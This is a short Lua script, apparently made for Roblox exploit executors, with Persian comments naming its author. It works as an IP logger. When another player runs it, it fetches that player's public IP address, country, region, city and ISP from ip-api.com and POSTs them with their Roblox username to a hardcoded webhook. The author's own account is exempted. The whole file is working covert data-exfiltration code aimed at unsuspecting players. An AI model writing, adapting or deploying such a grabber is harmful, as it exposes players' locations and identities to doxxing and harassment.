-- ============================================
--  IP + Approximate Location Webhook
--  Username check: artin09361
--  ساخته شده توسط آرتین
-- ============================================

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- لینک وب‌هوکت رو اینجا بذار
local WEBHOOK_URL = "https://play.svix.com/in/eRfGpewisQfE2kPhbmi2wS2FkdN/"

-- اگه یوزرنیم این بود، هیچی نفرست
if player.Name == "artin09361" then
    return
end

-- ============================================
--  گرفتن IP و موقعیت تقریبی از ip-api.com
-- ============================================
local function getIPAndLocation()
    local success, result = pcall(function()
        return game:HttpGet("http://ip-api.com/json")
    end)

    if not success or not result then
        return nil
    end

    local success2, data = pcall(function()
        return HttpService:JSONDecode(result)
    end)

    if not success2 or not data or data.status ~= "success" then
        return nil
    end

    return {
        ip = data.query,
        country = data.country,
        region = data.regionName,
        city = data.city,
        isp = data.isp
    }
end

-- ============================================
--  ساختن پیام و ارسال به وب‌هوک
-- ============================================
local info = getIPAndLocation()

if info then
    local message = "Roblox username: " .. player.Name .. "\n" ..
                    "IP: " .. info.ip .. "\n" ..
                    "Country: " .. info.country .. "\n" ..
                    "Region: " .. info.region .. "\n" ..
                    "City: " .. info.city .. "\n" ..
                    "ISP: " .. info.isp

    local request = (syn and syn.request) or (http and http.request) or http_request or request
    if request then
        pcall(function()
            request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode({ text = message })
            })
        end)
    end
end
